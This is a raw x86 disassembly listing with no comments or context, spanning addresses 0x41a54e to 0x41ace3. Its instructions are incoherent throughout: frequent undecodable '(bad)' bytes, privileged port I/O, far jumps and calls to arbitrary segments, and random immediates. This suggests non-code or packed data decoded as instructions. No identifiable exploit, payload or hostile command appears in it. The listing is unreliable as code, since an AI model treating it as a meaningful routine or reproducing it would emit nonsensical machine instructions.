  41a54e:	ja     0x41a4d4
  41a550:	mov    ah,0x2e
  41a552:	or     al,dl
  41a554:	cmp    BYTE PTR [edi],ah
  41a556:	outs   dx,DWORD PTR ds:[esi]
  41a557:	jmp    0xe388:0xed3c41de
  41a55e:	jne    0x41a5d2
  41a560:	mov    eax,ebp
  41a562:	mov    bl,0xf1
  41a564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a565:	push   es
  41a566:	data16 xor BYTE PTR [ecx+0x74d99891],0x2a
  41a56e:	sub    esi,DWORD PTR [ebp+0x54297b14]
  41a574:	jns    0x41a5b7
  41a576:	mov    edi,0x66b0df85
  41a57b:	pop    esi
  41a57c:	in     al,dx
  41a57d:	sbb    al,0xc8
  41a57f:	push   0x37
  41a581:	lahf   
  41a582:	sub    cl,ah
  41a584:	mov    al,ds:0x6a199a1e
  41a589:	dec    ebp
  41a58a:	pop    ss
  41a58b:	imul   edx,DWORD PTR [ebp-0x5a],0x4b
  41a58f:	(bad)  
  41a592:	cdq    
  41a593:	and    al,0x93
  41a595:	push   ds
  41a596:	jecxz  0x41a549
  41a598:	and    eax,0x1d6528f0
  41a59d:	das    
  41a59e:	dec    ebx
  41a59f:	jecxz  0x41a610
  41a5a1:	rol    BYTE PTR [edi-0x3e696ad6],0x51
  41a5a8:	repnz call 0x33ee:0xc2332e0d
  41a5b0:	outs   dx,DWORD PTR ds:[esi]
  41a5b1:	stc    
  41a5b2:	lock mov ebx,0x4263f20e
  41a5b8:	push   ebp
  41a5b9:	jg     0x41a5fd
  41a5bb:	pcmpeqd mm2,QWORD PTR [ebp+0x3aeb236]
  41a5c2:	pop    edi
  41a5c3:	scas   eax,DWORD PTR es:[edi]
  41a5c4:	call   0xefa4:0x5dbb5564
  41a5cb:	mov    al,0xf1
  41a5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5ce:	cld    
  41a5cf:	int3   
  41a5d0:	std    
  41a5d1:	pop    eax
  41a5d2:	into   
  41a5d3:	int3   
  41a5d4:	inc    ebp
  41a5d5:	(bad)  
  41a5d6:	dec    edi
  41a5d7:	js     0x41a55e
  41a5d9:	fisttp DWORD PTR [ecx+0x34a9d356]
  41a5df:	mov    dh,0x4c
  41a5e1:	push   edx
  41a5e2:	repnz (bad) 
  41a5e4:	jle    0x41a5ec
  41a5e6:	pop    ebx
  41a5e7:	cld    
  41a5e8:	shl    bh,cl
  41a5ea:	lahf   
  41a5eb:	iret   
  41a5ec:	push   esp
  41a5ed:	adc    bl,BYTE PTR [ecx-0x74ee5203]
  41a5f3:	cld    
  41a5f4:	js     0x41a5b7
  41a5f6:	xchg   DWORD PTR [edi],esp
  41a5f8:	js     0x41a679
  41a5fa:	cli    
  41a5fb:	leave  
  41a5fc:	test   al,0x7d
  41a5fe:	nop
  41a5ff:	or     BYTE PTR [esi-0x2ae1acc8],dl
  41a605:	push   ebx
  41a606:	and    edi,0x264da1ab
  41a60c:	and    dl,0xef
  41a60f:	adc    DWORD PTR [edi],edi
  41a611:	aas    
  41a612:	daa    
  41a613:	pop    edi
  41a614:	push   eax
  41a615:	sbb    BYTE PTR [ebx],al
  41a617:	cmp    eax,0xcca839c2
  41a61c:	out    0xe7,eax
  41a61e:	rcl    DWORD PTR ds:0x649eff51,cl
  41a624:	icebp  
  41a625:	imul   esi,DWORD PTR [esi+eiz*1-0x4bd0fd94],0xffffff9b
  41a62d:	cmc    
  41a62e:	jmp    0x41a616
  41a630:	call   0x88c3:0xf7f57cba
  41a637:	nop
  41a638:	pop    ecx
  41a639:	and    al,0xab
  41a63b:	adc    bh,BYTE PTR [esi-0x26]
  41a63e:	inc    esp
  41a63f:	clc    
  41a640:	out    0xe1,eax
  41a642:	xor    al,BYTE PTR [esi+0x20]
  41a645:	or     bl,BYTE PTR [edx]
  41a647:	adc    ecx,DWORD PTR cs:[esi+ebx*4-0x4e]
  41a64c:	cmp    al,0xd4
  41a64e:	ret    
  41a64f:	ror    ah,1
  41a651:	adc    cl,BYTE PTR [ecx]
  41a653:	stc    
  41a654:	clc    
  41a655:	pop    esi
  41a656:	add    al,0xaa
  41a658:	mov    esi,0xbb482bdd
  41a65d:	or     al,0x59
  41a65f:	adc    BYTE PTR [ecx+0x179214f4],bh
  41a665:	mov    ebp,0xe3260961
  41a66a:	leave  
  41a66b:	imul   esp,DWORD PTR [ebp-0x18],0xec5efe22
  41a672:	push   esi
  41a673:	popf   
  41a674:	aas    
  41a675:	addr16 xor ebp,edi
  41a678:	add    ebp,DWORD PTR ds:0xfb164a6
  41a67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a67f:	(bad)  
  41a681:	jne    0x41a6ab
  41a683:	cmp    eax,0xf19e88f2
  41a688:	in     al,dx
  41a689:	sbb    bl,dh
  41a68b:	aam    0xe
  41a68d:	sbb    ecx,DWORD PTR [esi-0x4aa404dd]
  41a693:	sbb    BYTE PTR [eax-0x15cd2ece],0x63
  41a69a:	xchg   ecx,eax
  41a69b:	inc    ebx
  41a69c:	repz xlat BYTE PTR ds:[ebx]
  41a69e:	xchg   BYTE PTR [edi+0x626d6f9a],ah
  41a6a4:	sub    DWORD PTR [ebx+esi*8-0x68],ebx
  41a6a8:	stos   DWORD PTR es:[edi],eax
  41a6a9:	loop   0x41a70f
  41a6ab:	fs inc edi
  41a6ad:	or     DWORD PTR [edx-0x4f],eax
  41a6b0:	repnz or dh,BYTE PTR [edi-0x47]
  41a6b4:	loop   0x41a6f6
  41a6b6:	cmp    eax,0x770c28ec
  41a6bb:	adc    DWORD PTR [ecx],esi
  41a6bd:	ss mov bh,0xb4
  41a6c0:	mov    bh,0xbe
  41a6c2:	cmc    
  41a6c3:	in     eax,0xa9
  41a6c5:	test   esp,ebx
  41a6c7:	ret    
  41a6c8:	pop    eax
  41a6c9:	mov    bh,0x44
  41a6cb:	lock ficomp DWORD PTR ds:0x525c83f9
  41a6d2:	(bad)  
  41a6d3:	gs xchg edi,eax
  41a6d5:	std    
  41a6d6:	das    
  41a6d7:	add    ah,BYTE PTR [esp+edx*8]
  41a6da:	cmp    DWORD PTR [ecx-0x60],esp
  41a6dd:	dec    ebx
  41a6de:	inc    edi
  41a6df:	and    eax,0x8b4e62f3
  41a6e4:	pushf  
  41a6e5:	push   ebp
  41a6e6:	jb     0x41a6c0
  41a6e8:	xchg   eax,edi
  41a6ea:	xchg   BYTE PTR [esi],cl
  41a6ec:	inc    esp
  41a6ed:	inc    ebp
  41a6ee:	sub    al,0x7e
  41a6f0:	psrad  mm0,QWORD PTR [edx]
  41a6f3:	or     ebp,eax
  41a6f5:	fwait
  41a6f6:	pop    edx
  41a6f7:	sbb    DWORD PTR [esi+eiz*1],edi
  41a6fa:	sub    ebp,DWORD PTR [esp+edi*2-0x32]
  41a6fe:	mov    eax,0x48b3d403
  41a703:	cmp    eax,DWORD PTR [edi]
  41a705:	jno    0x41a6a3
  41a707:	cmp    BYTE PTR [edi+0x2f],ah
  41a70a:	(bad)  
  41a70b:	dec    esp
  41a70c:	popa   
  41a70d:	or     ebp,DWORD PTR [esi+0x4e]
  41a710:	jg     0x41a6a4
  41a712:	dec    edx
  41a713:	imul   edx,ebp,0x372f690a
  41a719:	std    
  41a71a:	inc    esi
  41a71b:	mov    edi,0xf9543c52
  41a720:	mov    bh,0x87
  41a722:	scas   al,BYTE PTR es:[edi]
  41a723:	cld    
  41a724:	dec    esi
  41a725:	or     eax,0x33f0ea52
  41a72a:	inc    ecx
  41a72b:	lea    esp,[ecx+0xecbe920]
  41a731:	and    eax,0x9b8c7f1a
  41a736:	jle    0x41a77f
  41a738:	xchg   ecx,eax
  41a739:	fucomip st,st(1)
  41a73b:	test   eax,0xdc5c7d53
  41a740:	cld    
  41a741:	(bad)  
  41a742:	mov    edi,0x612e832e
  41a747:	xor    BYTE PTR [ecx],ah
  41a749:	int    0xc9
  41a74b:	cmp    DWORD PTR [eax],esi
  41a74d:	pusha  
  41a74e:	add    al,0x86
  41a750:	fsub   QWORD PTR [edi+edi*1-0x2ffc5393]
  41a757:	retf   0x2c92
  41a75a:	outs   dx,DWORD PTR ds:[esi]
  41a75b:	add    eax,0x702efb01
  41a760:	and    al,0x32
  41a762:	mov    sp,WORD PTR [eax+0x64a9ad6c]
  41a769:	imul   eax,DWORD PTR [eax],0x717e41c4
  41a76f:	repz scas eax,DWORD PTR es:[di]
  41a772:	mov    edi,0x7ea80f59
  41a777:	pop    ebx
  41a778:	jb     0x41a737
  41a77a:	out    dx,al
  41a77b:	mov    edi,0xb7c8ec93
  41a780:	dec    ebx
  41a781:	outs   dx,DWORD PTR ds:[esi]
  41a782:	pop    eax
  41a783:	popa   
  41a784:	and    al,0xbc
  41a786:	push   ebx
  41a787:	(bad)  
  41a788:	sub    edx,DWORD PTR [ecx]
  41a78a:	nop
  41a78b:	push   esp
  41a78c:	pushf  
  41a78d:	in     eax,0xa4
  41a78f:	in     eax,dx
  41a790:	push   edx
  41a791:	sbb    BYTE PTR [ebx-0x2db3d88],dl
  41a797:	mov    edx,0x3b7077de
  41a79c:	cli    
  41a79d:	xchg   ecx,eax
  41a79e:	stos   DWORD PTR es:[edi],eax
  41a79f:	sbb    ch,cl
  41a7a1:	(bad)
  41a7a5:	mov    eax,0x875c4f6d
  41a7aa:	fcom   QWORD PTR [esi]
  41a7ac:	pop    esp
  41a7ad:	ret    0x7412
  41a7b0:	shl    DWORD PTR [edi+0x2a5f0021],cl
  41a7b6:	ret    0xe68d
  41a7b9:	pop    esi
  41a7ba:	add    ebp,DWORD PTR ds:0x5ed551a5
  41a7c0:	(bad)  
  41a7c3:	(bad)  
  41a7c4:	cdq    
  41a7c5:	pop    es
  41a7c6:	add    ecx,DWORD PTR [eax+0x19]
  41a7c9:	mov    edi,0xc851729e
  41a7ce:	mov    BYTE PTR [edx+0x89d2b53],al
  41a7d4:	(bad)  
  41a7d5:	mov    eax,0xe48fd920
  41a7da:	ins    BYTE PTR es:[edi],dx
  41a7db:	lods   al,BYTE PTR ss:[esi]
  41a7dd:	pushf  
  41a7de:	das    
  41a7df:	les    edx,FWORD PTR [ecx]
  41a7e1:	stos   BYTE PTR es:[edi],al
  41a7e2:	cmp    al,0xcf
  41a7e4:	xor    BYTE PTR [esi-0x51],0x46
  41a7e8:	sbb    eax,0xa02c0afd
  41a7ed:	(bad)  
  41a7ef:	push   edi
  41a7f0:	into   
  41a7f1:	les    eax,FWORD PTR ds:[esp+ebp*4]
  41a7f5:	loopne 0x41a80e
  41a7f7:	add    cl,BYTE PTR [esi]
  41a7f9:	retf   
  41a7fa:	retf   0x4846
  41a7fd:	jmp    0x205cdfc1
  41a802:	ret    0x374e
  41a805:	ins    BYTE PTR es:[edi],dx
  41a806:	stc    
  41a807:	lock mov ah,0x72
  41a80a:	xchg   ecx,eax
  41a80b:	cmp    ecx,DWORD PTR [edi+eax*4]
  41a80e:	cs sub eax,0xb28f2f51
  41a814:	pushf  
  41a815:	out    0xaa,eax
  41a817:	pop    ebp
  41a818:	jbe    0x41a828
  41a81a:	sbb    BYTE PTR [eax-0x2d54d282],0x25
  41a821:	call   0xa40a3c01
  41a826:	jmp    0xcaa480c
  41a82b:	js     0x41a891
  41a82d:	adc    al,0xd9
  41a82f:	push   edx
  41a830:	mov    ch,0x4f
  41a832:	cmp    al,0x51
  41a834:	int3   
  41a835:	xlat   BYTE PTR ds:[ebx]
  41a836:	imul   edx,DWORD PTR [ebx],0xf8dbc6db
  41a83c:	imul   edi,DWORD PTR [edx-0x369947a3],0x8f075ff6
  41a846:	aam    0x59
  41a848:	xchg   esi,eax
  41a849:	rcr    bh,0x78
  41a84c:	lods   eax,DWORD PTR ds:[esi]
  41a84d:	mov    esi,0x3082fdb1
  41a852:	xor    BYTE PTR [eax+0x1cba611a],dl
  41a858:	xchg   edi,eax
  41a859:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a85a:	inc    esp
  41a85b:	inc    ebx
  41a85c:	std    
  41a85d:	mov    eax,0x805bcdb4
  41a862:	cmp    eax,0x7e59ecee
  41a867:	adc    bl,BYTE PTR [ecx+0x72]
  41a86a:	not    DWORD PTR [edx-0x1a]
  41a86d:	mov    WORD PTR [edi+ecx*4],fs
  41a870:	psrad  mm3,QWORD PTR [edx]
  41a873:	mov    eax,0x728899f2
  41a878:	enter  0x77bd,0x9c
  41a87c:	out    0xb5,eax
  41a87e:	leave  
  41a87f:	sbb    ebx,ebp
  41a881:	in     eax,0xea
  41a883:	iret   
  41a884:	sbb    al,0x67
  41a886:	pusha  
  41a887:	cmp    eax,0xd3c16001
  41a88c:	push   ecx
  41a88d:	test   al,al
  41a88f:	test   BYTE PTR [ecx-0x7ca3be2e],0x4
  41a896:	mul    BYTE PTR [ebx]
  41a898:	rol    DWORD PTR ds:0x53a107bc,cl
  41a89e:	push   cs
  41a89f:	mov    eax,ds:0xfc76e847
  41a8a4:	dec    esp
  41a8a5:	pop    es
  41a8a6:	ja     0x41a90f
  41a8a8:	out    dx,al
  41a8a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8aa:	dec    esi
  41a8ab:	jns    0x41a8e9
  41a8ad:	push   eax
  41a8ae:	(bad)
  41a8b1:	mov    dh,0x48
  41a8b3:	inc    edx
  41a8b4:	retf   0x839d
  41a8b7:	pushf  
  41a8b8:	push   esi
  41a8b9:	in     al,dx
  41a8ba:	out    dx,al
  41a8bb:	ins    DWORD PTR es:[edi],dx
  41a8bc:	pop    DWORD PTR [edi+0x184bfe01]
  41a8c2:	(bad)  
  41a8c3:	cli    
  41a8c4:	inc    ebx
  41a8c5:	and    al,0x1f
  41a8c7:	imul   edx,DWORD PTR [edi-0x60b30d08],0xf520c84a
  41a8d1:	cmc    
  41a8d2:	lds    esp,FWORD PTR [eax]
  41a8d4:	outs   dx,BYTE PTR ds:[esi]
  41a8d5:	sbb    DWORD PTR [esi],edx
  41a8d7:	cs adc eax,0xbfc7e2fd
  41a8dd:	sar    DWORD PTR [esi+ebx*4+0x33ffeee8],0xd0
  41a8e5:	stos   BYTE PTR es:[edi],al
  41a8e6:	mov    al,gs:0xd84f08a0
  41a8ec:	je     0x41a91b
  41a8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8ef:	mov    ebp,0x55d33d2a
  41a8f4:	fstp   QWORD PTR [edx-0x6c6030b0]
  41a8fa:	aas    
  41a8fb:	es xchg edx,eax
  41a8fd:	cdq    
  41a8fe:	inc    edi
  41a8ff:	dec    ebp
  41a900:	inc    edi
  41a901:	sbb    eax,0x7cdfb4a3
  41a906:	pop    eax
  41a907:	neg    BYTE PTR ds:0xd64bbb60
  41a90d:	add    ah,BYTE PTR [esi]
  41a90f:	in     eax,0x5c
  41a911:	bound  ebp,QWORD PTR [edx]
  41a913:	mov    al,0x67
  41a915:	push   ecx
  41a916:	xchg   ebp,eax
  41a917:	cmp    eax,0xe8ffa924
  41a91c:	adc    DWORD PTR [eax+ecx*2+0x63],esp
  41a920:	(bad)  [ecx+0xc1bdac0]
  41a926:	imul   ebx,ecx,0x96aeabcb
  41a92c:	ret    0xcede
  41a92f:	push   ecx
  41a930:	mov    BYTE PTR [ecx-0x62025fcd],bl
  41a936:	xor    al,0xfb
  41a938:	pop    es
  41a939:	icebp  
  41a93a:	sub    dh,BYTE PTR [ebx-0x26]
  41a93d:	dec    edi
  41a93e:	mov    ebp,0x51ebd141
  41a943:	push   eax
  41a944:	add    DWORD PTR [ebp+0x6ac92a7e],0x1c5402c1
  41a94e:	(bad)  
  41a94f:	lock mov eax,0x7530fb82
  41a955:	xchg   ecx,eax
  41a956:	iret   
  41a957:	add    eax,0x1767d6c4
  41a95c:	and    BYTE PTR [edi],ch
  41a95e:	daa    
  41a95f:	es int3 
  41a961:	lock pop ebx
  41a963:	(bad)
  41a967:	stos   DWORD PTR es:[edi],eax
  41a968:	les    ebx,FWORD PTR [esi-0x7cc99029]
  41a96e:	push   es
  41a96f:	and    edx,DWORD PTR [ebx-0x7a122058]
  41a975:	out    dx,al
  41a976:	xchg   ebp,eax
  41a977:	mov    esi,ecx
  41a979:	std    
  41a97a:	addr16 (bad) 
  41a97c:	into   
  41a97d:	retf   
  41a97e:	pop    DWORD PTR [eax+0x63ad14e1]
  41a984:	aam    0x81
  41a986:	jecxz  0x41a9db
  41a988:	ja     0x41a9ea
  41a98a:	ret    
  41a98b:	xor    eax,0x6aa97e7b
  41a990:	or     bh,ch
  41a992:	sbb    bl,BYTE PTR [eax-0x35bfdac]
  41a998:	dec    ebp
  41a999:	rcl    esp,1
  41a99b:	pop    eax
  41a99c:	sub    esi,DWORD PTR [ebx]
  41a99e:	loope  0x41a928
  41a9a0:	fcom   DWORD PTR [ebx]
  41a9a2:	pop    ebx
  41a9a3:	fptan  
  41a9a5:	or     al,0x25
  41a9a7:	repnz loop 0x41a94b
  41a9aa:	add    DWORD PTR [ebx],edi
  41a9ac:	jmp    0x4d41602
  41a9b1:	loop   0x41aa19
  41a9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b4:	or     edi,DWORD PTR ds:[esi]
  41a9b7:	cmp    BYTE PTR [ebx-0x28d4b434],0x23
  41a9be:	ret    0xdd8f
  41a9c1:	aam    0x40
  41a9c3:	and    ebp,DWORD PTR [edi+0x1738523a]
  41a9c9:	inc    eax
  41a9ca:	loopne 0x41a9b9
  41a9cc:	test   al,0xb0
  41a9ce:	mov    edi,0x56fc806
  41a9d3:	and    BYTE PTR [esi],dl
  41a9d5:	push   esi
  41a9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9d7:	rcl    BYTE PTR [edx-0x781512ef],0x73
  41a9de:	(bad)  
  41a9df:	test   DWORD PTR [ebp-0x5a46b264],0x1f672888
  41a9e9:	das    
  41a9ea:	mov    ebp,esi
  41a9ec:	push   ds
  41a9ed:	pop    ecx
  41a9ee:	or     bh,BYTE PTR [esi+0x24dedc08]
  41a9f4:	add    BYTE PTR [ebx+0x167666af],dl
  41a9fa:	push   eax
  41a9fb:	push   ds
  41a9fc:	jmp    0x93614d91
  41aa01:	in     eax,0x80
  41aa03:	add    al,bl
  41aa05:	imul   esi,DWORD PTR [ebp+ebp*2+0x5b127e4e],0xfffffff0
  41aa0d:	outs   dx,BYTE PTR ds:[esi]
  41aa0e:	cld    
  41aa0f:	mov    eax,0x11a175c6
  41aa15:	inc    BYTE PTR [edx-0x23fa8074]
  41aa1b:	rol    DWORD PTR [edi+0x1cceeeca],cl
  41aa21:	mov    dl,0xb7
  41aa23:	lods   eax,DWORD PTR ds:[esi]
  41aa24:	outs   dx,DWORD PTR ds:[esi]
  41aa25:	fs push edx
  41aa27:	sub    esp,DWORD PTR [edx]
  41aa29:	and    eax,0xc5aa4d04
  41aa2e:	stc    
  41aa2f:	jg     0x41aaaf
  41aa31:	(bad)  
  41aa32:	int3   
  41aa33:	mov    al,ds:0x6f33dfd9
  41aa38:	test   al,0xdf
  41aa3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3b:	sbb    eax,0x90e81f9b
  41aa40:	add    ah,BYTE PTR [esi]
  41aa42:	sti    
  41aa43:	mov    BYTE PTR [ebp+0x46bf7e8e],dl
  41aa49:	jg     0x41aa2a
  41aa4b:	mov    cl,0x52
  41aa4d:	cmp    BYTE PTR [esi+0x3db0e12],dh
  41aa53:	mov    eax,ds:0x8eb265e5
  41aa58:	cmp    eax,0x189769d2
  41aa5d:	push   edi
  41aa5e:	retf   0x63dd
  41aa61:	mov    bl,0x17
  41aa63:	scas   eax,DWORD PTR es:[edi]
  41aa64:	jnp    0x41aad3
  41aa66:	mov    ah,BYTE PTR [edi]
  41aa68:	imul   esi,DWORD PTR gs:[eax+0x6fa0a42b],0x28
  41aa70:	sub    al,0x79
  41aa72:	inc    eax
  41aa73:	and    al,0x89
  41aa75:	pop    esp
  41aa76:	(bad)  
  41aa77:	gs jge 0x41aa33
  41aa7a:	or     dh,dl
  41aa7c:	inc    esp
  41aa7d:	push   cs
  41aa7e:	cli    
  41aa7f:	outs   dx,DWORD PTR ds:[esi]
  41aa80:	mov    cl,0x60
  41aa82:	(bad)  
  41aa84:	and    bl,bl
  41aa86:	xlat   BYTE PTR ds:[ebx]
  41aa87:	pop    esi
  41aa88:	xchg   DWORD PTR ds:0x238fa041,edi
  41aa8e:	fdivr  DWORD PTR ds:0xb24b68c9
  41aa94:	or     al,BYTE PTR [esi+edx*1+0x6d]
  41aa98:	add    esi,DWORD PTR [ecx-0x2f557f3d]
  41aa9e:	out    0xd3,al
  41aaa0:	inc    edx
  41aaa1:	cmp    BYTE PTR [edx+0xfa62c0f],dl
  41aaa7:	dec    edi
  41aaa8:	gs sahf 
  41aaaa:	mov    ds:0xfe21908,al
  41aaaf:	rcr    BYTE PTR [eax-0x7e],0xc6
  41aab3:	inc    edi
  41aab4:	icebp  
  41aab5:	test   al,0xa2
  41aab7:	or     dh,bl
  41aab9:	(bad)  
  41aaba:	dec    edi
  41aabb:	sbb    DWORD PTR [edx-0x7c61071],esi
  41aac1:	sbb    ebx,DWORD PTR [eax+0xd]
  41aac4:	leave  
  41aac5:	sahf   
  41aac6:	add    edi,edi
  41aac8:	(bad)  [esi-0x2c919253]
  41aace:	stos   DWORD PTR es:[edi],eax
  41aacf:	int3   
  41aad0:	mov    esp,0xddfd7c96
  41aad5:	adc    ax,cx
  41aad8:	mov    ebx,0x296fbf96
  41aadd:	ret    0x1dd3
  41aae0:	repnz dec eax
  41aae2:	sub    esi,DWORD PTR [ecx+0x652cf9af]
  41aae8:	in     al,dx
  41aae9:	imul   edi,DWORD PTR [edi+ecx*4],0xaaebce97
  41aaf0:	idiv   DWORD PTR [ebp-0x5e2d5a76]
  41aaf6:	mov    edi,0x761e1e8b
  41aafb:	cs add bh,cl
  41aafe:	dec    ebx
  41aaff:	into   
  41ab00:	aaa    
  41ab01:	loopne 0x41ab01
  41ab03:	push   edi
  41ab04:	and    eax,0x3424958f
  41ab09:	icebp  
  41ab0a:	adc    al,0xde
  41ab0c:	mov    edi,0xfe968c25
  41ab11:	cdq    
  41ab12:	add    DWORD PTR [edi+ecx*1-0x35],edx
  41ab16:	je     0x41ab14
  41ab18:	xchg   ecx,eax
  41ab19:	cmc    
  41ab1a:	pmaddwd mm7,QWORD PTR [edx+0x63]
  41ab1e:	push   edx
  41ab1f:	xchg   ecx,eax
  41ab20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab21:	add    dl,ah
  41ab23:	ffreep st(5)
  41ab25:	sbb    BYTE PTR [eax-0x35],dh
  41ab28:	push   edi
  41ab29:	sbb    bh,ch
  41ab2b:	sahf   
  41ab2c:	(bad)  
  41ab2e:	jns    0x41ab17
  41ab30:	retf   0xd5d9
  41ab33:	jbe    0x41ab56
  41ab35:	sar    ah,0xfb
  41ab38:	pop    esi
  41ab39:	jo     0x41ab6a
  41ab3b:	adc    al,0xf7
  41ab3d:	mov    esp,0x3f695f55
  41ab42:	in     al,dx
  41ab43:	dec    edx
  41ab44:	mov    BYTE PTR [edi+0x2282a5a3],bh
  41ab4a:	(bad)  
  41ab4b:	aam    0xd
  41ab4d:	inc    ecx
  41ab4e:	cld    
  41ab4f:	dec    edi
  41ab50:	ret    
  41ab51:	push   0xffffffeb
  41ab53:	mov    ebx,0x2b7a4c2a
  41ab58:	out    0x6,al
  41ab5a:	outs   dx,DWORD PTR ds:[esi]
  41ab5b:	push   es
  41ab5c:	sbb    BYTE PTR [edx],dh
  41ab5e:	popa   
  41ab5f:	retf   0x833d
  41ab62:	neg    ch
  41ab64:	cmp    DWORD PTR [ecx+ebx*8-0x27],esi
  41ab68:	lods   eax,DWORD PTR ds:[esi]
  41ab69:	sbb    eax,0xd2e2d4b4
  41ab6e:	cmc    
  41ab6f:	jmp    0xcb37:0x9395e6cb
  41ab76:	adc    dh,BYTE PTR fs:[ebx-0x2c116b86]
  41ab7d:	les    ebp,FWORD PTR [ebx-0x46]
  41ab80:	jle    0x41abce
  41ab82:	and    ah,bh
  41ab84:	and    BYTE PTR [esi],ch
  41ab86:	and    eax,0x90b1609d
  41ab8b:	pop    eax
  41ab8c:	aas    
  41ab8d:	mov    ecx,ecx
  41ab8f:	(bad)  
  41ab90:	dec    DWORD PTR [eax-0x2a]
  41ab93:	xchg   edx,eax
  41ab94:	lods   al,BYTE PTR ds:[esi]
  41ab95:	push   ecx
  41ab96:	popf   
  41ab97:	jnp    0x41abbb
  41ab99:	mov    esp,0xd316370d
  41ab9e:	(bad)  
  41ab9f:	jno    0x41ac1f
  41aba1:	bound  eax,QWORD PTR [eax]
  41aba3:	pop    esp
  41aba4:	push   edx
  41aba5:	or     DWORD PTR [eax],ebx
  41aba7:	loop   0x41ab94
  41aba9:	mov    eax,ds:0xbca3d38
  41abae:	cld    
  41abaf:	lock ss dec esp
  41abb2:	(bad)  
  41abb3:	int3   
  41abb4:	add    DWORD PTR [edi],edi
  41abb6:	pop    ebx
  41abb7:	adc    eax,0x854b216f
  41abbc:	inc    eax
  41abbd:	mov    dh,0x36
  41abbf:	sbb    eax,0xb979efd1
  41abc4:	sub    BYTE PTR [edx+0x3656eb9a],dl
  41abca:	cdq    
  41abcb:	adc    DWORD PTR [esi+0x37076ff9],0x24763df1
  41abd5:	add    al,0xac
  41abd7:	hlt    
  41abd8:	add    ah,0x9
  41abdb:	leave  
  41abdc:	popf   
  41abdd:	aaa    
  41abde:	iret   
  41abdf:	dec    edi
  41abe0:	aas    
  41abe1:	stc    
  41abe2:	mov    ds:0x2ede5c2b,eax
  41abe7:	enter  0x85bf,0x43
  41abeb:	pushf  
  41abec:	fist   DWORD PTR [edx+0x7c]
  41abef:	cld    
  41abf0:	fnsave [ebx-0x72]
  41abf3:	dec    esi
  41abf4:	push   es
  41abf5:	adc    BYTE PTR [eax-0x79],dl
  41abf8:	sbb    bl,BYTE PTR cs:[eax]
  41abfb:	rol    BYTE PTR [eax+0x5a],cl
  41abfe:	scas   eax,DWORD PTR es:[edi]
  41abff:	stos   BYTE PTR es:[edi],al
  41ac00:	dec    ebp
  41ac01:	dec    eax
  41ac02:	pop    ds
  41ac03:	mov    ecx,0xf9616e
  41ac08:	sbb    esi,DWORD PTR [eax-0x7e2d7638]
  41ac0e:	retf   
  41ac0f:	mov    ebx,0xbf2fe6bf
  41ac14:	mov    esp,0x24c0a91f
  41ac19:	jecxz  0x41ac80
  41ac1b:	inc    ecx
  41ac1c:	loop   0x41ac17
  41ac1e:	scas   eax,DWORD PTR es:[edi]
  41ac1f:	sbb    esp,DWORD PTR [edx+0x27]
  41ac22:	aaa    
  41ac23:	pop    es
  41ac24:	xor    al,0x57
  41ac26:	mov    dl,0xbb
  41ac28:	inc    esp
  41ac29:	jo     0x41ac31
  41ac2b:	pop    ecx
  41ac2c:	adc    al,0xc9
  41ac2e:	iret   
  41ac2f:	xor    bh,BYTE PTR [ecx-0x1d]
  41ac32:	data16 hlt 
  41ac34:	push   0x9
  41ac36:	mov    edx,0xdc24303e
  41ac3b:	or     al,0x6f
  41ac3d:	jo     0x41ac22
  41ac3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac40:	pop    ss
  41ac41:	mov    al,0xe
  41ac43:	xor    al,0xda
  41ac45:	test   eax,0x443afe62
  41ac4a:	xor    edx,edi
  41ac4c:	mov    ecx,0xeb15c7d8
  41ac51:	(bad)  [edx-0x6d]
  41ac54:	ror    BYTE PTR [edi+0x14],0xa1
  41ac58:	loop   0x41ac73
  41ac5a:	gs sbb eax,0x21912854
  41ac60:	iret   
  41ac61:	and    bl,BYTE PTR [eax-0x5aae07b1]
  41ac67:	mov    ah,BYTE PTR [ebx-0x2d53cd1]
  41ac6d:	loop   0x41ac2a
  41ac6f:	cdq    
  41ac70:	rcl    dl,1
  41ac72:	out    0x85,al
  41ac74:	and    eax,0xe478fc3c
  41ac79:	retf   0x42e2
  41ac7c:	xchg   edx,eax
  41ac7d:	push   ecx
  41ac7e:	jl     0x41aca2
  41ac80:	xor    esp,DWORD PTR [edx+0x5c]
  41ac83:	test   BYTE PTR [eax],dl
  41ac85:	xchg   esp,eax
  41ac86:	jmp    0xf58f496a
  41ac8b:	iret   
  41ac8c:	fmulp  st(3),st
  41ac8e:	or     esi,DWORD PTR [edx+0x81eb21e]
  41ac94:	retf   
  41ac95:	les    esp,FWORD PTR ds:0xf1ef98ff
  41ac9b:	jno    0x41ac83
  41ac9d:	jo     0x41acf3
  41ac9f:	or     eax,0xecb44df8
  41aca4:	push   edi
  41aca5:	or     esp,DWORD PTR [edi]
  41aca7:	push   ss
  41aca8:	and    ecx,eax
  41acaa:	retf   
  41acab:	call   0xdac4:0xf88c23ae
  41acb2:	pop    edx
  41acb3:	sub    BYTE PTR [edi],cl
  41acb5:	aas    
  41acb6:	fxch   st(4)
  41acb8:	mov    dh,0x1e
  41acba:	inc    esp
  41acbb:	mov    al,ds:0x36fe2098
  41acc0:	jne    0x41ac9b
  41acc2:	xchg   BYTE PTR [eax],ah
  41acc4:	ins    BYTE PTR es:[edi],dx
  41acc5:	jle    0x41ac88
  41acc7:	pusha  
  41acc8:	inc    edi
  41acc9:	mov    dl,0xd7
  41accb:	daa    
  41accc:	adc    ch,BYTE PTR [eax]
  41acce:	in     al,0x80
  41acd0:	mov    ah,0x9d
  41acd2:	pop    edi
  41acd3:	add    eax,0x6c6b5720
  41acd8:	or     al,0xa3
  41acda:	(bad)  
  41acdb:	(bad)  
  41acdc:	sub    esi,DWORD PTR [edi]
  41acde:	jb     0x41ac77
  41ace0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ace1:	pop    eax
  41ace2:	inc    esp
  41ace3:	adc    al,BYTE PTR [eax]
